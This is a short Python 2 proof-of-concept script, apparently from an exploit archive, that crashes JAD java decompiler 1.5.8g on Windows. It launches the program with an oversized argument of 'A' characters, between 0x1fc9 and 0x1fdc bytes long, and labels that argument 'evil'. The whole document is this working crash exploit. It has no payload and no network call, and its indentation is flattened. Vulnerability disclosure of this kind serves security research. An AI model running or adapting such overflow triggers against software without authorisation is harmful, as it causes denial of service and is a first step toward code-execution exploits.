#!/usr/bin/env python
#JAD java decompiler 1.5.8g (argument) Local Crash
#Tested on Windows
#Software Link: http://www.varaneckas.com/jad
#Author: l3D
#Site: http://xraysecurity.blogspot.com
#IRC: irc://irc.nix.co.il
#Email: pupipup33@gmail.com

#The software crashes when it gets an argument that is between 0x1fc9 to 0x1fdc bytes.

from random import randint
import os, sys

if len(sys.argv) != 1:
path=sys.argv[1]
else:
path='jad.exe'

if not os.path.exists(path):
print 'Usage: python %s [path to jad.exe]' % sys.argv[0]
exit(-1)

evil='A'*randint(0x1fc9, 0x1fdc)
os.execl(path, path, evil)